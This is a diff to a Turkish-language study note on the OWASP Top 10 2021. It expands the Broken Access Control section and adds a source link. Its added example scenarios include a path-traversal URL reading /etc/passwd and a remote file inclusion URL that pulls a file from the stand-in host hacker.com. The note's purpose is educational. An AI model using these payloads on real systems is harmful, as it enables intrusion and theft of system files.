@@ -1,5 +1,5 @@
 # İçerik
-- [ ] A01: Broken Access Control
+- [x] A01: Broken Access Control
 - [ ] A02: Cryptographic Failures
 - [ ] A03 Inejcttion
 - [ ] A04 Insecure Design
@@ -14,9 +14,9 @@
 
 # A01:2021 -  Bozuk Erişim Kontrolü ( Broken Access Control)
 Erişim kontrolü kullanıcıların yetkileri dışına çıkmamalarını sağlamaktadır. Yetkisiz kullanıcının, yetkisi dışında gerçekleştirebildiği işlemler bu güvenlik açığını ortaya çıkarmaktadır. Erişim denetimleri birçok yöntem ile bypass edilebilmektedir. **Authentication** (kimlik doğrulama) ve **Authorization** (yetkilendirme), konuyla ilgili çnemli kavramlardır. Kimlik doğrulama, kullanıcının kim olduğunun doğrulandığı işlemdir. Yetkilendirme işlemi ise kullanıcının kimliğine göre yetkilerin kontrol edilmesidir. Erişim kontrolü, kullanıcının gerçekleştireceği işlemi yapıp yapamayacağını belirlemektedir. Erişim Denetim Türleri üç kategoride incelenebilmektedir.
-	1. Vertical Access Control (Dikey Erişim Kontrolü): Bu kontrol mekanizmasında, normal kullanıcıların yönetici izinlerini kullanmasına izin vermez.
-	2. Horizontal Access Control (Yatay Erişim Kontrolü):
-	3. Context-Dependent Access Control (Bağlamsal Erişim Kontrolü):
+	1. Vertical Access Control (Dikey Erişim Kontrolü): Bu kontrol mekanizmasında, normal kullanıcıların yönetici izinlerini kullanmasına izin vermez.Kullanıcı türüne göre yetkilendirme yapılabilir.
+	2. Horizontal Access Control (Yatay Erişim Kontrolü):  Kullanıcıların kaynakları ayrıdır. Bir kullanıcı başka bir kullanıcının kaynaklarına ve yetkilerine erişim sağlayamaz.
+	3. Context-Dependent Access Control (Bağlamsal Erişim Kontrolü): Kullanıcının gerçekleştiği işlemlerin sırasına göre yetkilendirme işlemi gerçekleşmektedir. Örneğin, kullanıcı sepetine ürün ekleme/çıkarma gibi işlemleri gerçekleştirebilir. Ödeme yapıldıktan sonra satın aldığı ürünleri değiştirememesi gerekir.
 
 <mark style="background-color: red">Güvenlik açıklıkları</mark>
 - URL veya HTML sayfasında değişiklik yapma, API isteklerini düzenleme 
@@ -33,13 +33,16 @@ Erişim kontrolü, sunucu tarafının güvenilir olmasıyla veya server-less(sun
 - Her istekte izinlerin doğrulanması
 - Erişim izinlerinin varsayılan olarak kapalı olması 
 - Bağlantı adresi içerisindeki id parametresi değiştirilemese bile erişilmez olması gerekmektedir.
+- 
 
 Note:
 JWT(JSON Web Token) json objelerini kullanarak uygulama ve kullanıcı arasında güvenli veri taşımayı sağlar ve taşıdığı verinin bütünlüğünü doğrulayabilmektedir.Oturum yönetimi için kullanılır. Giriş yapan her kullanıcı tokene sahiptir böylece hangi izinlere sahip olduğu içerisinde  belirtilir. Brute force yöntemini kullanarak dizin listeleme yaparak token doğrulama,XXE, CSRF saldırıları ile anahtar değeri sızdırılabilir. JWT, başlık, payload, imza şeklinde 3 parçadan oluşur ve encode edilmiş haldedir. https://jwt.io/ sitesinde örnek gösterimi bulunmaktadır.
 
 <mark>Örnek Saldırı Senaryoları</mark>
 
-- **Senaryo 1:** Uygulama içerisinde hesap bilgilerine erişilen kısımda doğrulanmamış verilerin kullanılması, tehdit aktörünün bağlantı adresindeki id parametresini değiştirerek herhangi bir hesaba erişmesine neden olabilir. 
+- Uygulama içerisinde hesap bilgilerine erişilen kısımda doğrulanmamış verilerin kullanılması, tehdit aktörünün bağlantı adresindeki id parametresini değiştirerek herhangi bir hesaba erişmesine neden olabilir. 
+- Admin sayfasına erişim sağlayabilmesi (örneğin, `https://target.com/admin` gibi)
+- Directory Traversal File Include (Dizin veya dosya yolu geçişi) yani, bağlantı adresi ile sunucu içerisindeki dosyaya erişim sağlamak. Yerel ve uzaktan dosya dahil etme olarak iki türlü gerçekleşebilmektedir. LFI(Local File Inclusion), sunucu içerisinde yani yerelde bulunan dosyaları okuyabilme ve içeriğine erişebilme işleminin gerçekleşmesidir. Örneğin,  `http://example.com/getUserProfile.jsp?item=../../../../etc/passwd` şeklinde yapılan aramada kullanıcıların giriş bilgilerini tutan dosyaya erişim sağlanabilir eğer LFI zafiyeti bulunuyorsa. RFI(Remote File Inclusion), zafiyetinde ise uzak sunucudan dosya yüklenebilmesi ve çalıştırılmasıdır. Örnek olarak `http://example.com/index.php?file=http://hacker.com/malicious.txt` . Tehdit aktörü, sunucu içerisine hacker.com adresinden malicious.txt isimli dosyayı yüklemektedir. Atlatma yöntemlerinde encoding işlemleri de gerçekleşmektedir.
 
 
 
@@ -48,6 +51,8 @@ JWT(JSON Web Token) json objelerini kullanarak uygulama ve kullanıcı arasında
 
 ---
 # A02:2021 Cryptographic Failures (Kriptografik Hatalar)
+
+- [ ] TODO
 
 ---
 # A03:2021 Injection
@@ -75,7 +80,7 @@ Injection zafiyetinin önlenmesi için,
 
 # A04: Insecure Design
 
-
+- [ ] TODO
 
 ---
 # Kaynak 
@@ -84,6 +89,7 @@ Injection zafiyetinin önlenmesi için,
 * [JWT Nedir, Güvenlik Kontrolleri Nasıl Yapılandırılır?](https://medium.com/trendyol-tech/jwt-nedir-g%C3%BCvenlik-kontrolleri-nas%C4%B1l-yap%C4%B1l%C4%B1r-3421ebc33989)
 * [Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
 * [A Comprehensive Guide to Broken Access Control](https://www.prplbx.com/resources/blog/broken-access-control/)
+* [Local File İnclusion Nedir ?](https://murat-mdk64.medium.com/local-file-i%CC%87nclusion-nedir-9afd23473405)
 * 
 
 
